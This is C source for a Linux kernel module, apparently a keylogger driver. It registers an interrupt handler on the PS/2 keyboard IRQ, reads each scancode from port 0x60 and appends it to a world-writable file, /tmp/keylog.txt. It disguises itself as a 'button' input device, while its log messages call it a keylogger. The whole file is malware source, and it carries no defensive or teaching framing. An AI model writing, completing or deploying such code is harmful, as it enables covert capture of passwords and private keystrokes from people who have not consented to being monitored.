#include <linux/module.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/io.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/spinlock.h>

#define BUTTON_IRQ 1     // IRQ klawiatury PS/2
#define BUTTON_PORT 0x60 // Port klawiatury PS/2
#define LOG_FILE_PATH "/tmp/keylog.txt"

static struct input_dev *button_dev;
static void write_to_log_file(const char *data)
{
    struct file *log_file;
    ssize_t ret;

    log_file = filp_open(LOG_FILE_PATH, O_WRONLY | O_CREAT | O_APPEND, 0777);
    if (IS_ERR(log_file))
    {
        pr_err("Failed to open log file\n");
        return;
    }

    ret = kernel_write(log_file, data, strlen(data), &log_file->f_pos);
    if (ret < 0)
    {
        pr_err("Failed to write to log file: %zd\n", ret);
    }

    filp_close(log_file, NULL);
}

static irqreturn_t button_interrupt(int irq, void *dummy)
{
    int scancode;
    char log_entry[32] = {0};

    scancode = inb(BUTTON_PORT);

    if (scancode & 0x80)
    {
        int keycode = scancode & 0x7F;

        input_report_key(button_dev, keycode, 0);

        if (keycode == 42)
        {
            snprintf(log_entry, sizeof(log_entry), "%d", 99);
            write_to_log_file(log_entry);
        }
    }
    else
    {
        input_report_key(button_dev, scancode, 1);

        snprintf(log_entry, sizeof(log_entry), "%d", scancode);
        write_to_log_file(log_entry);
    }

    input_sync(button_dev);
    return IRQ_HANDLED;
}

static int __init button_init(void)
{
    int error;

    pr_info("Initializing Keylogger Driver\n");

    if (request_irq(BUTTON_IRQ, button_interrupt, IRQF_SHARED, "button", (void *)button_interrupt))
    {
        pr_err("Failed to allocate IRQ %d\n", BUTTON_IRQ);
        return -EBUSY;
    }

    button_dev = input_allocate_device();
    if (!button_dev)
    {
        pr_err("Not enough memory to allocate input device\n");
        error = -ENOMEM;
        goto err_free_irq;
    }

    button_dev->name = "Button Device with Key Logging";
    button_dev->evbit[0] = BIT_MASK(EV_KEY);

    
    error = input_register_device(button_dev);
    if (error)
    {
        pr_err("Failed to register input device\n");
        goto err_free_dev;
    }

    pr_info("Button input driver with key logging loaded successfully\n");
    return 0;

err_free_dev:
    input_free_device(button_dev);
err_free_irq:
    free_irq(BUTTON_IRQ, (void *)button_interrupt);
    return error;
}

static void __exit button_exit(void)
{
    input_unregister_device(button_dev);
    free_irq(BUTTON_IRQ, (void *)button_interrupt);
    pr_info("Keylogger driver unloaded\n");
}

module_init(button_init);
module_exit(button_exit);
